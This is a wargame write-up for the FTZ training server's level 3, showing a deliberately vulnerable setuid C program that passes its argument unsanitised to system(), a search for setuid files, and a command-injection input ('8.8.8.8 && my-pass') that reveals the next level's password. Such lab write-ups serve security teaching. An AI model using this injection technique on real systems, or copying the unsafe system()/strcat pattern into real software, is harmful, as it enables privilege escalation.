### Credential 
```
level3 / can you fly?
```

### Solution
```
[level3@ftz level3]$ ls
hint  public_html  tmp

[level3@ftz level3]$ cat hint 


다음 코드는 autodig의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main(int argc, char **argv){
 
    char cmd[100];
 
    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }
 
    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");
 
    system( cmd );
 
}

이를 이용하여 level4의 권한을 얻어라.

more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면?


[level3@ftz level3]$ find / -perm +4000 -user level4 2>/dev/null
/bin/autodig

[level3@ftz level3]$ ls -al /bin/autodig 
-rwsr-x---    1 level4   level3      12194 Sep 10  2011 /bin/autodig

[level3@ftz level3]$ /bin/autodig 8.8.8.8             

; <<>> DiG 9.2.1 <<>> @8.8.8.8 version.bind chaos txt
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9732
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;version.bind.			CH	TXT

;; ANSWER SECTION:
version.bind.		0	CH	TXT	"dnsmasq-2.45"

;; Query time: 29 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Aug 13 03:28:27 2018
;; MSG SIZE  rcvd: 55

[level3@ftz level3]$ /bin/autodig "8.8.8.8 && my-pass"

; <<>> DiG 9.2.1 <<>> @8.8.8.8
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8668
;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;.				IN	NS

;; ANSWER SECTION:
.			40273	IN	NS	m.root-servers.net.
.			40273	IN	NS	e.root-servers.net.
.			40273	IN	NS	c.root-servers.net.
.			40273	IN	NS	g.root-servers.net.
.			40273	IN	NS	d.root-servers.net.
.			40273	IN	NS	j.root-servers.net.
.			40273	IN	NS	b.root-servers.net.
.			40273	IN	NS	l.root-servers.net.
.			40273	IN	NS	a.root-servers.net.
.			40273	IN	NS	k.root-servers.net.
.			40273	IN	NS	f.root-servers.net.
.			40273	IN	NS	i.root-servers.net.
.			40273	IN	NS	h.root-servers.net.

;; ADDITIONAL SECTION:
a.root-servers.net.	303544	IN	AAAA	2001:503:ba3e::2:30

;; Query time: 35 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Mon Aug 13 03:28:39 2018
;; MSG SIZE  rcvd: 256

'xterm-256color': unknown terminal type.

Level4 Password is "suck my brain".


```
